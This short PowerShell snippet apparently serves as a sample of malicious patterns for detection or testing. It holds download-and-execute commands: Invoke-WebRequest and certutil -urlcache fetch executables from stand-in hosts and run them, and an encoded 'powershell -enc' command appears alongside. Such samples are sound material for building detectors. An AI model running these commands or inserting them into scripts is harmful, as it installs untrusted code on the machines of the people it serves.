# Suspicious PowerShell download-and-execute script
$DownloadURL = "http://bit.ly/malware-tool"
$OutputPath = "C:\Temp\payload.exe"

# Download and execute without verification
Invoke-WebRequest -Uri $DownloadURL -OutFile $OutputPath -ErrorAction SilentlyContinue

# Execute the downloaded file directly
& $OutputPath

# Alternative suspicious pattern
powershell -enc UwB0YXJ0LVByb2Nlc3MgYy5jb20v

# certutil abuse pattern (common malware)
certutil -urlcache -split -f "http://unknown-site.com/file.exe" C:\Temp\file.exe
